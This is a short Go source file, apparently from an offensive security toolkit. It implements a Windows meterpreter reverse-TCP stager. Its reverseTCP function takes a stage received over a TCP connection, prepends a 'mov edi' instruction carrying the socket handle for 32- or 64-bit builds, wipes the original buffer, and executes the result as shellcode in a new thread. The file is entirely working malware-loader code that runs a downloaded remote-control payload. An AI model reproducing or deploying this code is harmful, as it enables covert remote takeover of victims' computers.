// +build windows

package meterpreter

import (
	"encoding/binary"
	"net"
	"runtime"

	"project/internal/module/shellcode"
)

func reverseTCP(conn *net.TCPConn, stage []byte, _ string) error {
	stageSize := len(stage)
	const mov = 0xBF
	// make final stage
	// BF 78 56 34 12 => mov edi, 0x12345678
	// BF + socket handle
	var final []byte
	switch runtime.GOARCH {
	case "386":
		final = make([]byte, 1+4+stageSize)
		for i := 0; i < stageSize; i++ {
			final[i+1+4] = stage[i]
			stage[i] = 0 // cover stage at once
		}
		final[0] = mov
		// write handle
		binary.LittleEndian.PutUint32(final[1:1+4], uint32(conn.Handle()))
	case "amd64":
		final = make([]byte, 1+8+stageSize)
		for i := 0; i < stageSize; i++ {
			final[i+1+8] = stage[i]
			stage[i] = 0 // cover stage at once
		}
		final[0] = mov
		// write handle
		binary.LittleEndian.PutUint64(final[1:1+8], uint64(conn.Handle()))
	}
	// must force use MethodCreateThread, otherwise it will
	// panic, because meterpreter need rwx memory
	return shellcode.Execute(shellcode.MethodCreateThread, final)
}
